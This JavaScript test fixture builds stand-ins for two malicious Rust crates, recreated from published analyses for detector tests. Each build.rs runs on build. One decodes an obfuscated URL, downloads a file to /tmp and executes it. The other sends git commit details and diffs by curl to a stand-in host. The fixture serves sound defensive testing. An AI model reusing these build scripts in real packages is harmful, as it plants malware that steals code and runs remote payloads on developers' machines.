// Stand-ins for two real Rust supply-chain attacks, written from the published analyses
// (StepSecurity, Socket and Wiz on arrayref/proc-macro1, Aikido on onering), not copied from the
// malicious crates: crates.io removed those versions. The addresses point nowhere real. Used by
// the tests and by bench/rust.mjs, which also rewrites them the ways attackers hide strings.
const j = (...p) => p.join("");

export const PROC_MACRO1 = {
  "Cargo.toml": "[package]\nname = \"proc-macro1\"\nversion = \"1.0.107\"\nedition = \"2021\"\n\n[build-dependencies]\nbase64 = \"0.22\"\nrustls = { version = \"0.23\", features = [\"ring\"] }\nureq = { version = \"2\", features = [\"tls\"] }\n",
  "src/lib.rs": "pub fn span() {}\n",
  "build.rs": j("use base64::{engine::general_purpose::STANDARD, Engine};\nuse std::os::unix::fs::PermissionsExt;\nconst SRC_URL_PARTS: [&str; 3] = [\"aHR0cHM6Ly8=\", \"MTAuMC4w\", \"LjEvc2V0dXA=\"];\n",
    "#[derive(Debug)] struct AcceptAll;\nimpl rustls::client::danger::ServerCertVerifier for AcceptAll {}\n",
    "fn main() {\n  let url: String = SRC_URL_PARTS.iter().map(|p| String::from_utf8(STANDARD.decode(p).unwrap()).unwrap()).collect();\n",
    "  let body = ureq::get(&url).call().unwrap().into_reader();\n  let setup_path = std::path::Path::new(\"/tmp/rust-setup\");\n  std::io::copy(&mut body.take(1 << 24), &mut std::fs::File::create(setup_path).unwrap()).unwrap();\n",
    "  std::fs::set_permissions(setup_path, std::fs::Permissions::from_mode(0o755)).unwrap();\n  let child = std::process::Command::new(setup_path).spawn().unwrap();\n  std::mem::forget(child);\n}\n"),
};
export const ONERING = {
  "Cargo.toml": "[package]\nname = \"onering\"\nversion = \"1.4.1\"\nedition = \"2021\"\n\n[build-dependencies]\nuuid = { version = \"1\", features = [\"v4\"] }\n",
  "src/lib.rs": "pub struct Ring;\n",
  "build.rs": j("use std::process::Command;\nfn git(root: &std::path::Path, args: &[&str]) -> String {\n  String::from_utf8(Command::new(\"git\").current_dir(root).args(args).output().unwrap().stdout).unwrap()\n}\n",
    "fn request(body: &str) {\n  Command::new(\"cu", "rl\").args([\"-s\", \"-X\", \"POST\", \"https://ingest.example/api/1/envelope/\", \"--data-binary\", body]).status().ok();\n}\n",
    "fn main() {\n  let out = std::path::PathBuf::from(std::env::var(\"OUT_DIR\").unwrap());\n  let root = out.ancestors().find(|p| p.ends_with(\"target\")).unwrap().parent().unwrap();\n",
    "  let head = git(root, &[\"log\", \"-n\", \"1\", \"--pretty=format:%H %an %ae\"]);\n  let patch = git(root, &[\"diff\", \"HEAD^\", \"HEAD\"]);\n  request(&format!(\"{} {} {}\", uuid::Uuid::new_v4().as_simple(), head, patch));\n}\n"),
};

